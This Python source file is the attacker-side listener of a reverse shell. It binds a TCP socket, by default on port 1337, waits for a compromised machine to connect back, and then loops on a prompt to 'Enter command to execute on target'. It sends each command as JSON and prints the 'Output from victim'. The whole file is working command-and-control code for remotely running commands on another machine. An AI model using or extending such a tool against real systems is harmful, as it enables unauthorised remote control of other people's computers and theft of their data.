import socket, sys, json, argparse, subprocess
from sys import getsizeof
from itertools import cycle
import multiprocessing, time


class fc:
    rw = '\033[31;107m'
    r = '\033[38;5;196m'
    pv = '\033[38;5;206;48;5;57m'
    end = '\033[0m'
    pink = '\033[38;5;206m'
    y = '\033[0;33;40m'
    purple = '\033[0;35m'
    wg = '\033[37;42m'
    cyan = '\033[36m'
    g = '\033[38;5;154m'
    b = '\033[38;5;45m'


class Args:
    
    
    def __init__(self):
        parser = argparse.ArgumentParser()
        parser.add_argument('-i','--IP',dest = 'ip', help = 'Enter target IP address.')
        parser.add_argument('-p','--port',dest = 'port', help = 'Enter target port.')
        parser.set_defaults(ip = self.get_ip())
        parser.set_defaults(port = 1337)
        options = parser.parse_args()
        self.ip = options.ip
        self.port = options.port
        
    
    def get_ip(self):
        pipecmd_ip = "/sbin/ip route | awk '/src/ { printf $9 }'"
        ip = subprocess.check_output(pipecmd_ip,shell=True)
        ip_decoded = ip.decode('utf-8')
        self.ip = ip_decoded
        return self.ip


class Listener:
    
    
    def __init__(self,ip,port):
        spinner = multiprocessing.Process(target=self.spinner)
        #self.byteTotal = 0
        self.listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        self.listener.bind((str(ip),port)) #bind to this machine! 127.0.0.1 might work to? 
        self.listener.listen(0)
        print(f'Starting listener on address {fc.b}{ip}{fc.end} and port {fc.b}{port}{fc.end}.\n{fc.y}Waiting for connection...{fc.end}'.format(ip,port)) #add a threading spinner here
        spinner.start()
        try:
            self.connection,address = self.listener.accept() #address is tuple with address and port
        except KeyboardInterrupt:
            spinner.terminate()
            print('\nSIGINT caught, exiting...')
            sys.exit()
        #print(connection) #connection is the socket object with information about local address and remote address
        spinner.terminate()
        print(f'{fc.g}Connection established with {fc.pink}{str(address[0])}{fc.end} on port {fc.pink}{str(address[1])}{fc.end}')
        print(f'Enter {fc.rw}\'bye\'{fc.end} to close connection')
    
    
    def sendStream(self,data):
        jsData = json.dumps(data)
        self.connection.send(str(jsData).encode('utf-8'))
    
    
    def spinner(self):
        spinnerChars = ['-', '/', '|', '\\']
        while True:
            for char in cycle(spinnerChars):
                print(f'{fc.pv}{char}{fc.end}',end='\r')
                time.sleep(.2)

    
    def recvStream(self):
        jsData = ''
        #print(getsizeof(jsData))
        while True:
            try:
                recvData = self.connection.recv(1024)
                if isinstance(recvData,bytes):
                    recvData = recvData.decode()
                #print(getsizeof(jsData))
                #byteSize = getsizeof(jsData)
                #self.byteTotal += byteSize
                jsData = jsData + recvData
                return json.loads(jsData)
            except Exception as e:
                print(f'{fc.rw}{e}{fc.end}\n{fc.wg}Incomplete stream, gathering remainder of data.{fc.end}')
                continue
                
    
    def utf8len(self,string):
        return len(string.encode('utf-8'))


    def executeCmd(self,cmd):
        #cmd = str(cmd).encode('utf-8')
        #print('executeCmd')
        #print(cmd)
        self.sendStream(cmd)
        #result = self.connection.recv(1024)
        #result = result.decode()
        return self.recvStream() #calling.executeCmd will return the result of the command sent by run()


    def run(self): #so my run() function will need to do the exit call logic, execCmd just needs to send and receive the command from run
        while True:
            inputChecker = False
            while inputChecker == False:
                try:
                    cmd = input(f'{fc.r}Enter command to execute on target:{fc.end}')
                    if cmd == '':
                        print(f'{fc.rw}Command must not be blank!{fc.end}')
                    else:
                        inputChecker = True
                    #print(cmd)
                    cmd = cmd.split(' ')
                    #print(cmd)
                except KeyboardInterrupt:
                    self.sendStream(['bye'])
                    self.listener.close()
                    exit()


            if cmd[0] != 'bye':
                result = self.executeCmd(cmd)
                print(f'Output from victim, {fc.g}{self.utf8len(result)}{fc.end} bytes long')
                print(f'{fc.purple}#{fc.end}'*100)
                print(f'{fc.b}{result}{fc.end}')
                print(f'{fc.purple}#{fc.end}'*100)
            else:
                print(f'{fc.rw}Exit call received, closing connection{fc.end}')
                self.sendStream(cmd)
                self.listener.close()
                exit() 
          

try:
    args = Args()
    listener = Listener(args.ip,args.port)
    listener.run()


except Exception as e:
    print(f'\tError: {fc.rw}{e}{fc.end}')
    sys.exit()


except KeyboardInterrupt:
    print(f'{fc.rw}Interrupt caught, exiting...{fc.end}')
    sys.exit()



